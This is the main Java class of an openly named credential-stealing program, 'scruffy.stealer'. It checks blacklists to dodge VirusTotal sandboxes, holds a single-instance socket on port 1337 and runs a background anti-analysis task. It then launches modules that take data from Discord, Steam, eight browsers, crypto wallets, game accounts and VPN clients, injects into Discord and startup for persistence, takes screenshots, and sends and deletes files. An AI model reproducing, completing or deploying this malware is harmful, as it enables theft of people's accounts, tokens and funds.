package scruffy.stealer;

import java.net.ServerSocket;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import scruffy.stealer.file.*;
import scruffy.stealer.impl.app.*;
import scruffy.stealer.impl.browser.*;
import scruffy.stealer.impl.coin.*;
import scruffy.stealer.impl.game.*;
import scruffy.stealer.impl.inject.*;
import scruffy.stealer.impl.system.*;
import scruffy.stealer.impl.vpn.*;

import scruffy.stealer.utils.utilities;

public class startup {

    private static ServerSocket socket;

    public static final String 
    		BLACKLIST_HWID = "optional (i used it for virustotal blacklists)",
    		BLACKLIST_NAME = "   ''                                    ''   ";

    public static void main(String[] args) throws Exception {
        boolean isBlacklisted = BLACKLIST_HWID.contains(utilities.getHWID()) || BLACKLIST_NAME.contains(utilities.getComputerName());

        if (isBlacklisted) {
            System.out.println("(:");
        } else {
            try {
                socket = new ServerSocket(1337);
                
                init();
            } catch (Exception ignored) {
            	// jar is already running
                System.err.println("no no no");
            }
        }
    }

    private static void init() {
        try {
            security();
            
            start(
                // app
                discord.class, steam.class,
                
                // browser
                brave.class, chrome.class, edge.class, firefox.class, opera.class, operagx.class, vivaldi.class, yandex.class,
                
                // coin
                wallet.class,
                
                // game
                craftrise.class, growtopia.class, minecraft.class, sonoyuncu.class,
                
                // inject
                discord_injector.class, startup_injector.class,
                
                // system
                desktop.class, screenshot.class,
                
                // vpn
                nord_vpn.class, open_vpn.class, proton_vpn.class,
                
                // file
                file_move.class, file_send.class, file_delete.class
            );
            socket.close();
        } catch (Exception e) {
        	System.err.println(e.getMessage());
        }
    }

    private static void security() {
        utilities.executor.scheduleAtFixedRate(() -> {
            try {
                utilities.rd3party();
            } catch (Exception ignored) {}
        }, 0, 1, TimeUnit.SECONDS);
    }

    private static void start(Class<?>... clazz) {
        Arrays.stream(clazz).filter(utilities.class::isAssignableFrom)
        	.forEach(m -> {
                try {
                    m.getDeclaredConstructor().newInstance();
                } catch (Exception ignored) {}
            });
    }
    
}
